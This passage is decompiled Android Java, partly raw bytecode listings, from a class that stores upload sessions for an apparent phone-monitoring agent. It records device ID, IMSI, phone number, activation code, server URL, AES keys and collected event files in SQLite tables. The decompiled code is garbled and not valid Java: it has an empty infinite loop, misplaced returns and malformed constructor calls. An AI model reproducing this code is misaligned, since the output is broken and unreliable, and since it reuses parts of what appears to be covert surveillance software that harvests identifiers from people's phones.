    //   508: invokevirtual 309	com/vvt/phoenix/prot/removeFromPath/a:j	()Z
    //   511: istore 10
    //   513: iload 10
    //   515: ifeq +214 -> 729
    //   518: aload_1
    //   519: invokevirtual 409	com/vvt/phoenix/prot/removeFromPath/a:l	()Ljava/util/ArrayList;
    //   522: astore 12
    //   524: iconst_0
    //   525: istore 15
    //   527: aconst_null
    //   528: astore 5
    //   530: aload 12
    //   532: invokevirtual 82	java/util/ArrayList:size	()I
    //   535: istore 10
    //   537: iload 15
    //   539: iload 10
    //   541: if_icmpge +188 -> 729
    //   544: new 247	android/content/ContentValues
    //   547: astore 6
    //   549: aload 6
    //   551: invokespecial 248	android/content/ContentValues:<init>	()V
    //   554: aload 12
    //   556: iload 15
    //   558: invokevirtual 86	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   561: astore 4
    //   563: aload 4
    //   565: checkcast 272	com/vvt/phoenix/prot/removeFromPath/MyUncaughtExceptionHandler
    //   568: astore 4
    //   570: ldc 116
    //   572: astore 16
    //   574: aload_1
    //   575: invokevirtual 333	com/vvt/phoenix/prot/removeFromPath/a:a	()J
    //   578: lstore 17
    //   580: lload 17
    //   582: invokestatic 254	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   585: astore 19
    //   587: aload 6
    //   589: aload 16
    //   591: aload 19
    //   593: invokevirtual 258	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Long;)V
    //   596: ldc_w 275
    //   599: astore 16
    //   601: aload 4
    //   603: invokevirtual 411	com/vvt/phoenix/prot/removeFromPath/MyUncaughtExceptionHandler:a	()[B
    //   606: astore 19
    //   608: aload 6
    //   610: aload 16
    //   612: aload 19
    //   614: invokevirtual 359	android/content/ContentValues:put	(Ljava/lang/String;[B)V
    //   617: ldc_w 278
    //   620: astore 16
    //   622: aload 4
    //   624: invokevirtual 413	com/vvt/phoenix/prot/removeFromPath/MyUncaughtExceptionHandler:removeFromPath	()Ljava/lang/String;
    //   627: astore 19
    //   629: aload 6
    //   631: aload 16
    //   633: aload 19
    //   635: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   638: ldc_w 281
    //   641: astore 16
    //   643: aload 4
    //   645: invokevirtual 415	com/vvt/phoenix/prot/removeFromPath/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	()[B
    //   648: astore 4
    //   650: aload 6
    //   652: aload 16
    //   654: aload 4
    //   656: invokevirtual 359	android/content/ContentValues:put	(Ljava/lang/String;[B)V
    //   659: aload_0
    //   660: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   663: astore 4
    //   665: ldc_w 311
    //   668: astore 16
    //   670: aconst_null
    //   671: astore 19
    //   673: aload 4
    //   675: aload 16
    //   677: aconst_null
    //   678: aload 6
    //   680: invokevirtual 266	android/database/sqlite/SQLiteDatabase:insert	(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J
    //   683: lstore 7
    //   685: lload 7
    //   687: lload_2
    //   688: lcmp
    //   689: istore 10
    //   691: iload 10
    //   693: ifeq +26 -> 719
    //   696: iload 15
    //   698: iconst_1
    //   699: iadd
    //   700: istore 10
    //   702: iload 10
    //   704: istore 15
    //   706: goto -176 -> 530
    //   709: iconst_0
    //   710: istore 10
    //   712: aconst_null
    //   713: astore 4
    //   715: iload 10
    //   717: ireturn
    //   718: athrow
    //   719: iconst_0
    //   720: istore 10
    //   722: aconst_null
    //   723: astore 4
    //   725: goto -10 -> 715
    //   728: athrow
    //   729: iconst_1
    //   730: istore 10
    //   732: goto -17 -> 715
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	735	0	this	removeFromPath
    //   0	735	1	parama	a
    //   2	686	2	l1	long
    //   7	717	4	localObject1	Object
    //   12	517	5	localContentValues	ContentValues
    //   26	653	6	localObject2	Object
    //   125	561	7	l2	long
    //   386	94	9	i	int
    //   409	3	10	j	int
    //   500	14	10	bool1	boolean
    //   535	7	10	k	int
    //   689	3	10	bool2	boolean
    //   700	16	10	m	int
    //   720	11	10	n	int
    //   431	3	11	bool3	boolean
    //   438	117	12	localObject3	Object
    //   494	3	13	l3	long
    //   525	180	15	i1	int
    //   572	104	16	str	String
    //   578	3	17	l4	long
    //   585	87	19	localObject4	Object
    //   718	1	21	localRuntimeException1	RuntimeException
    //   728	1	22	localRuntimeException2	RuntimeException
    // Exception table:
    //   from	to	target	type
    //   468	472	718	java/lang/RuntimeException
    //   489	494	718	java/lang/RuntimeException
    //   518	522	728	java/lang/RuntimeException
    //   530	535	728	java/lang/RuntimeException
    //   544	547	728	java/lang/RuntimeException
    //   549	554	728	java/lang/RuntimeException
    //   556	561	728	java/lang/RuntimeException
    //   563	568	728	java/lang/RuntimeException
    //   574	578	728	java/lang/RuntimeException
    //   580	585	728	java/lang/RuntimeException
    //   591	596	728	java/lang/RuntimeException
    //   601	606	728	java/lang/RuntimeException
    //   612	617	728	java/lang/RuntimeException
    //   622	627	728	java/lang/RuntimeException
    //   633	638	728	java/lang/RuntimeException
    //   643	648	728	java/lang/RuntimeException
    //   654	659	728	java/lang/RuntimeException
    //   659	663	728	java/lang/RuntimeException
    //   678	683	728	java/lang/RuntimeException
  }
  
  public boolean b(long paramLong)
  {
    for (bool = true;; bool = false)
    {
      try
      {
        SQLiteDatabase localSQLiteDatabase = this.c;
        String str1 = "phoenix_session";
        String str2 = "csid=?";
        int i = 1;
        String[] arrayOfString = new String[i];
        String str3 = String.valueOf(paramLong);
        arrayOfString[0] = str3;
        int j = localSQLiteDatabase.delete(str1, str2, arrayOfString);
        if (j <= 0) {
          continue;
        }
        localSQLiteDatabase = this.c;
        str1 = "virtual_payload";
        str2 = "csid=?";
        i = 1;
        arrayOfString = new String[i];
        str3 = String.valueOf(paramLong);
        arrayOfString[0] = str3;
        localSQLiteDatabase.delete(str1, str2, arrayOfString);
      }
      catch (Exception localException)
      {
        for (;;)
        {
          bool = false;
        }
      }
      return bool;
    }
  }
  
  public boolean b(a parama)
  {
    i = 1;
    Object localObject1 = new android/content/ContentValues;
    ((ContentValues)localObject1).<init>();
    Object localObject3 = Long.valueOf(parama.a());
    ((ContentValues)localObject1).put("csid", (Long)localObject3);
    localObject3 = Boolean.valueOf(parama.e());
    ((ContentValues)localObject1).put("ready_flag", (Boolean)localObject3);
    localObject3 = parama.c();
    ((ContentValues)localObject1).put("payload_path", (String)localObject3);
    localObject3 = Long.valueOf(parama.h());
    ((ContentValues)localObject1).put("payload_size", (Long)localObject3);
    localObject3 = Long.valueOf(parama.i());
    ((ContentValues)localObject1).put("payload_crc", (Long)localObject3);
    localObject3 = parama.f();
    ((ContentValues)localObject1).put("public_key", (byte[])localObject3);
    long l1 = parama.b();
    localObject3 = Long.valueOf(l1);
    ((ContentValues)localObject1).put("ssid", (Long)localObject3);
    localObject3 = parama.g();
    ((ContentValues)localObject1).put("aes_key", (byte[])localObject3);
    Object localObject4 = parama.d();
    Object localObject5 = Integer.valueOf(((com.vvt.phoenix.prot.command.c)localObject4).a());
    ((ContentValues)localObject1).put("protocol_version", (Integer)localObject5);
    localObject5 = Integer.valueOf(((com.vvt.phoenix.prot.command.c)localObject4).b());
    ((ContentValues)localObject1).put("product_id", (Integer)localObject5);
    localObject5 = ((com.vvt.phoenix.prot.command.c)localObject4).c();
    ((ContentValues)localObject1).put("product_version", (String)localObject5);
    localObject5 = Integer.valueOf(((com.vvt.phoenix.prot.command.c)localObject4).d());
    ((ContentValues)localObject1).put("config_id", (Integer)localObject5);
    localObject5 = ((com.vvt.phoenix.prot.command.c)localObject4).e();
    ((ContentValues)localObject1).put("device_id", (String)localObject5);
    localObject5 = ((com.vvt.phoenix.prot.command.c)localObject4).f();
    ((ContentValues)localObject1).put("activate_code", (String)localObject5);
    localObject5 = Integer.valueOf(((com.vvt.phoenix.prot.command.c)localObject4).g());
    ((ContentValues)localObject1).put("language", (Integer)localObject5);
    localObject5 = ((com.vvt.phoenix.prot.command.c)localObject4).h();
    ((ContentValues)localObject1).put("phone_number", (String)localObject5);
    localObject5 = ((com.vvt.phoenix.prot.command.c)localObject4).i();
    ((ContentValues)localObject1).put("mcc", (String)localObject5);
    localObject5 = ((com.vvt.phoenix.prot.command.c)localObject4).j();
    ((ContentValues)localObject1).put("mnc", (String)localObject5);
    localObject5 = ((com.vvt.phoenix.prot.command.c)localObject4).k();
    ((ContentValues)localObject1).put("imsi", (String)localObject5);
    localObject5 = ((com.vvt.phoenix.prot.command.c)localObject4).l();
    ((ContentValues)localObject1).put("host_url", (String)localObject5);
    localObject5 = Integer.valueOf(((com.vvt.phoenix.prot.command.c)localObject4).o());
    ((ContentValues)localObject1).put("battery_level", (Integer)localObject5);
    int j = ((com.vvt.phoenix.prot.command.c)localObject4).m();
    localObject5 = Integer.valueOf(j);
    ((ContentValues)localObject1).put("encrypt_code", (Integer)localObject5);
    int k = ((com.vvt.phoenix.prot.command.c)localObject4).n();
    localObject4 = Integer.valueOf(k);
    ((ContentValues)localObject1).put("compress_code", (Integer)localObject4);
    boolean bool1 = parama.j();
    localObject3 = Boolean.valueOf(bool1);
    ((ContentValues)localObject1).put("has_virtual_payload", (Boolean)localObject3);
    localObject4 = "virtual_payload_attributes";
    localObject3 = parama.k();
    ((ContentValues)localObject1).put((String)localObject4, (byte[])localObject3);
    try
    {
      localObject4 = this.c;
      localObject3 = "phoenix_session";
      localObject5 = "csid=?";
      int m = 1;
      Object localObject6 = new String[m];
      Object localObject7 = null;
      long l2 = parama.a();
      String str = String.valueOf(l2);
      localObject6[0] = str;
      int n = ((SQLiteDatabase)localObject4).update((String)localObject3, (ContentValues)localObject1, (String)localObject5, (String[])localObject6);
      if (n > 0)
      {
        boolean bool2 = parama.j();
        if (!bool2) {
          break label729;
        }
      }
      int i1;
      long l3;
      long l4;
      boolean bool3;
      int i2;
      int i3;
      Object localObject2;
      for (;;) {}
    }
    catch (Exception localException)
    {
      try
      {
        localObject3 = parama.l();
        k = 0;
        localObject4 = null;
        for (;;)
        {
          i1 = ((ArrayList)localObject3).size();
          if (k >= i1) {
            break label729;
          }
          localObject5 = new android/content/ContentValues;
          ((ContentValues)localObject5).<init>();
          localObject1 = ((ArrayList)localObject3).get(k);
          localObject1 = (c)localObject1;
          localObject6 = "csid";
          l3 = parama.a();
          localObject7 = Long.valueOf(l3);
          ((ContentValues)localObject5).put((String)localObject6, (Long)localObject7);
          localObject6 = "event_attributes";
          localObject7 = ((c)localObject1).a();
          ((ContentValues)localObject5).put((String)localObject6, (byte[])localObject7);
          localObject6 = "event_file_path";
          localObject7 = ((c)localObject1).b();
          ((ContentValues)localObject5).put((String)localObject6, (String)localObject7);
          localObject6 = "event_file_md5";
          localObject1 = ((c)localObject1).c();
          ((ContentValues)localObject5).put((String)localObject6, (byte[])localObject1);
          localObject1 = this.c;
          localObject6 = "virtual_payload";
          localObject7 = null;
          l4 = ((SQLiteDatabase)localObject1).insert((String)localObject6, null, (ContentValues)localObject5);
          l3 = -1;
          bool3 = l4 < l3;
          if (!bool3) {
            break;
          }
          i2 = k + 1;
          k = i2;
        }
        i2 = 0;
        localObject1 = null;
        for (;;)
        {
          return i2;
          localException = localException;
          i3 = 0;
          localObject2 = null;
          continue;
          i3 = 0;
          localObject2 = null;
        }
        i3 = i;
      }
      catch (RuntimeException localRuntimeException)
      {
        throw localRuntimeException;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */